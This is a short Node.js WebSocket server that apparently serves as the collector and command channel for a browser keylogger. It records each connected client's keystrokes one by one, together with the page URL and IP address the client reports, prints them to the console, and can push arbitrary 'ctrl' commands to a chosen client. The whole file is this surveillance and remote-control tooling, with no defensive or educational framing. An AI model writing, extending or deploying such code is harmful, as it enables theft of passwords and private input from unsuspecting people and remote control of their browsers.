const WebSocket=require('ws');
const wss=new WebSocket.Server({port:8080});
wss.on('connection',function connection(ws){
ws.id=Math.round(Math.random()*10000000000);
ws.string="";
console.log(`Client ${ws.id} connected.`);
ws.on('message',function incoming(data){
data=JSON.parse(data);
if(data.k==="Enter"){ws.string+="\r\n";}else{ws.string+=data.k;}ws.loc=data.url;ws.ip=data.ip;log();
if(data.type=="ctrl"){control(data.to,data.cmd);}
});
ws.on('close',function incoming(data){console.log(`Client ${ws.id} disconnected.`);});
});
function log(){wss.clients.forEach(function each(client){if(client.readyState==WebSocket.OPEN){console.log(`Client ${client.id} from ${client.ip} at \r\n${client.loc}: \r\n\r\n${client.string}\r\n\r\n`);}});}
function control(to,cmd){wss.clients.forEach(function each(client){if(client.readyState==WebSocket.OPEN&&client.id==to){client.send(JSON.stringify({type:"ctrl",cmd:cmd}));}});}